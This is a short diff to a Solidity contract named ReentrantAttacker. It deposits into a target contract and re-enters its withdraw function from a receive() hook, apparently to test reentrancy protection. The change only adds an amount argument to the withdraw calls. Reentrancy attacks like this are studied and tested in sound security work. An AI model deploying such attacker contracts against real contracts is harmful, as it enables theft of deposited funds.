@@ -13,13 +13,13 @@ contract ReentrantAttacker {
 
     function attack() external payable {
         target.deposit{value: msg.value}();
-        target.withdraw();
+        target.withdraw(msg.value);
     }
 
     receive() external payable {
         if (!attacking) {
             attacking = true;
-            try target.withdraw() {} catch {}
+            try target.withdraw(msg.value) {} catch {}
             attacking = false;
         }
     }
